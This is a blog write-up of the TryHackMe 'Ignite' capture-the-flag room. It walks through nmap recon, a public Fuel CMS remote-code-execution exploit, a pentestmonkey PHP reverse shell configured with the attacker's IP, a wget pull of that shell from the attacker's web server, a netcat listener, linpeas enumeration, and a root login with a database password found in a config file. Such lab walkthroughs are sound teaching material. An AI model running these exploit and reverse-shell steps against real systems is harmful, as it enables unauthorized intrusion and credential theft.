---
layout: page
title: Ignite
description: Exploited Fuel CMS via public vulnerability
img: 
importance: 4
category: TryHackMe
team: Red Team Labs
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/ignite/logo.png" title="THM Ignite Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://tryhackme.com/room/ignite">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Time to light it up with the Ignite room.

Give nmap a run to find those services.

{% capture nmap %}
┌──(kali㉿kali)-[~/Documents/thm/ignite]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.220.6    
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-14 22:51 AEDT
Nmap scan report for 10.10.220.6
Host is up (0.26s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=1/14%OT=80%CT=1%CU=33853%PV=Y%DS=4%DC=T%G=Y%TM=6786
OS:4FFF%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=A)
OS:OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508
OS:ST11NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)
OS:ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
OS:%CD=S)

Network Distance: 4 hops

TRACEROUTE (using port 199/tcp)
HOP RTT       ADDRESS
1   7.70 ms   10.4.0.1
2   ... 3
4   261.69 ms 10.10.220.6

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.67 seconds
1   7.70 ms   10.4.0.1
2   ... 3
4   261.69 ms 10.10.220.6

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.67 seconds
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=nmap %}

<br />
Check the robots.txt file.  Check to see if there is anything interesting.

{% capture t_browser %}
User-agent: *
Disallow: /fuel/
#
{% endcapture %}
{% include terminal.html language='browser' title='http://10.10.220.6/robots.txt' content=t_browser %}

<br />
Check the /simple directory that is running on the webserver.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/ignite/landing.png" title="Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the /fuel directory that was mentioned in the robots.txt file.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/ignite/fuel.png" title="Fuel Directory" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Searchsploit for the the fuel cms.

{% capture searchsploit %}
┌──(kali㉿kali)-[~/Documents/thm/ignite]
└─$ searchsploit fuel cms
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
fuel CMS 1.4.1 - Remote Code Execution (1)                                                                                                                                                                | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                                                                                                                                                                | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                                                                                                                                                                | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)                                                                                                                                               | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                                                                                                                                                      | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                                                                                                                                          | php/webapps/48778.txt
Fuel CMS 1.5.0 - Cross-Site Request Forgery (CSRF)                                                                                                                                                        | php/webapps/50884.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=searchsploit %}

<br />
Look-up the credentials for the Fuel CMS.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/ignite/default.png" title="Default Creds" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://docs.idrivecompute.com/hc/en-us/articles/8577487575325-How-to-install-Fuel-CMS-on-Ubuntu#:~:text=To%20access%20the%20administration%20page,the%20Fuel%20CMS%20Dashboard%20page.">https://docs.idrivecompute.com/hc/en-us/articles/8577487575325-How-to-install-Fuel-CMS-on-Ubuntu#:~:text=To%20access%20the%20administration%20page,the%20Fuel%20CMS%20Dashboard%20page.</a>

<br />
Test the credentials and login.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/ignite/testcreds.png" title="Test the Credentials" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Copy the exploit into the local working folder.

{% capture cpexploit %}
┌──(kali㉿kali)-[~/Documents/thm/ignite]
└─$ cp $(locate 50477.py) .
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=cpexploit %}

<br />
Run the exploit and gain command execution.

{% capture testlsexploit %}
┌──(kali㉿kali)-[~/Documents/thm/ignite]
└─$ python3 50477.py -u http://10.10.220.6
[+]Connecting...
Enter Command $ls
systemREADME.md
assets
composer.json
contributing.md
fuel
index.php
robots.txt
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=testlsexploit %}

<br />
Start a netcat listener.

{% capture start443listener %}
┌──(kali㉿kali)-[~/Documents/thm/madness]
└─$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php -O shell.php
--2025-01-14 23:26:52--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 2606:50c0:8002::154, 2606:50c0:8001::154, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5491 (5.4K) [text/plain]
Saving to: ‘shell.php’

shell.php                                                  100%[========================================================================================================================================>]   5.36K  --.-KB/s    in 0s      

2025-01-14 23:26:52 (56.0 MB/s) - ‘shell.php’ saved [5491/5491] 
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=start443listener %}

<br />
Download Pentest Monkey PHP reverse shell.

<br />
Update the IP and port in the script for your particular attack machine.

{% capture pentestmonkey %}
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.

<snip>

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.4.119.29';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

<snip>

?>
{% endcapture %}
{% include terminal.html language='php' title='shell.php' content=pentestmonkey %}

<br />
Start a python webserver.

{% capture pyserver %}
┌──(kali㉿kali)-[~/Documents/thm/madness]
└─$ python -m 'http.server'                         
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=pyserver %}

<br />
Use the RCE to transfer the shell to the web root directory.

{% capture tansfershell %}
Enter Command $pwd
system/var/www/html


Enter Command $wget http://10.4.119.29:8000/shell.php -O shell.php
system
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=tansfershell %}

<br />
Navigate to the webpage to trigger the payload.

{% capture curlshell %}
┌──(kali㉿kali)-[~/Documents/thm/ignite]
└─$ curl http://10.10.52.234/shell.php
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=curlshell %}

<br />
Check the webpage and catch the shell.

{% capture catchshell %}
┌──(kali㉿kali)-[~/Documents/thm/madness]
└─$ sudo nc -nlvp 443                               
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.4.119.29] from (UNKNOWN) [10.10.220.6] 42304
Linux ubuntu 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 04:30:18 up 42 min,  0 users,  load average: 1.07, 1.06, 0.94
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash");'
www-data@ubuntu:/$
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=catchshell %}

<br />
Get the user.txt flag.

{% capture userflag %}
www-data@ubuntu:/home/www-data$ cat flag.txt
cat flag.txt
<redacted> 
www-data@ubuntu:/home/www-data$ ifconfig
ifconfig
eth0      Link encap:Ethernet  HWaddr 02:bf:0d:69:b3:6d  
          inet addr:10.10.220.6  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::bf:dff:fe69:b36d/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:2341 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2205 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:229841 (229.8 KB)  TX bytes:874062 (874.0 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:180 errors:0 dropped:0 overruns:0 frame:0
          TX packets:180 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:13916 (13.9 KB)  TX bytes:13916 (13.9 KB)
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=userflag %}

<br />
Download the linpeas enumeration script.

{% capture downloadlinpeas %}
┌──(kali㉿kali)-[~/Documents/thm/ignite]
└─$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20250113-4426d62e/linpeas.sh                                   
--2025-01-14 23:39:57--  https://github.com/peass-ng/PEASS-ng/releases/download/20250113-4426d62e/linpeas.sh
Resolving github.com (github.com)... 140.82.112.4
Connecting to github.com (github.com)|140.82.112.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/a36145da-bdb8-4fba-af77-22dc24ac95e1?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250114%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250114T123958Z&X-Amz-Expires=300&X-Amz-Signature=1e78b4ea944c4d0cf448687182d9c7a5b39132681470226f30c4d41826c75fa7&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream [following]
--2025-01-14 23:39:58--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/a36145da-bdb8-4fba-af77-22dc24ac95e1?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250114%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250114T123958Z&X-Amz-Expires=300&X-Amz-Signature=1e78b4ea944c4d0cf448687182d9c7a5b39132681470226f30c4d41826c75fa7&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.109.133
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 830426 (811K) [application/octet-stream]
Saving to: ‘linpeas.sh’

linpeas.sh                                                 100%[========================================================================================================================================>] 810.96K  2.13MB/s    in 0.4s    

2025-01-14 23:40:00 (2.13 MB/s) - ‘linpeas.sh’ saved [830426/830426]
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=downloadlinpeas %}

<br />
Transfer the peas to the victim machine.

{% capture transferlinpeas %}
www-data@ubuntu:/home/www-data$ wget http://10.4.119.29:8000/linpeas.sh
wget http://10.4.119.29:8000/linpeas.sh
--2025-01-14 04:41:04--  http://10.4.119.29:8000/linpeas.sh
Connecting to 10.4.119.29:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 830426 (811K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 810.96K   330KB/s    in 2.5s    

2025-01-14 04:41:07 (330 KB/s) - 'linpeas.sh' saved [830426/830426]

www-data@ubuntu:/home/www-data$ chmod +x linpeas.sh
chmod +x linpeas.sh
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=transferlinpeas %}

<br />
Run the linpeas and notice the password in the database.php file.

{% capture runlinpeas %}
www-data@ubuntu:/home/www-data$ ./linpeas.sh
./linpeas.sh



                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

<snip>

╔══════════╣ Searching passwords in config PHP files
/var/www/html/fuel/application/config/database.php:     'password' => 'mememe',

<snip>
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=runlinpeas %}

<br />
Check the database.php file directly.

{% capture databasephp %}
<?php
defined('BASEPATH') OR exit('No direct script access allowed');

<snip>

$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',

<snip>
{% endcapture %}
{% include terminal.html language='php' title='database.php' content=databasephp %}

<br />
Use the password from the file to su into the root account.

{% capture suroot %}
www-data@ubuntu:/dev/shm$ su
su
Password: mememe

root@ubuntu:/dev/shm# whoami
whoami
root
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=suroot %}

<br />
Get the root.txt file.

{% capture rootflag %}
root@ubuntu:/dev/shm# cat /root/root.txt
cat /root/root.txt                                                                                                                                                                                                                          
<redacted>                                                                                                                                                                                                         
root@ubuntu:/dev/shm# ip a                                                                                                                                                                                                                  
ip a                                                                                                                                                                                                                                        
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000                                                                                                                                                 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00                                                                                                                                                                                   
    inet 127.0.0.1/8 scope host lo                                                                                                                                                                                                          
       valid_lft forever preferred_lft forever                                                                                                                                                                                              
    inet6 ::1/128 scope host                                                                                                                                                                                                                
       valid_lft forever preferred_lft forever                                                                                                                                                                                              
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000                                                                                                                                       
    link/ether 02:6f:9a:41:26:0b brd ff:ff:ff:ff:ff:ff                                                                                                                                                                                      
    inet 10.10.52.234/16 brd 10.10.255.255 scope global eth0                                                                                                                                                                                
       valid_lft forever preferred_lft forever                                                                                                                                                                                              
    inet6 fe80::6f:9aff:fe41:260b/64 scope link                                                                                                                                                                                             
       valid_lft forever preferred_lft forever
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=rootflag %}

<br />
Another room/box torched!  Hopefully you enjoyed the write-up.  See you in the next one.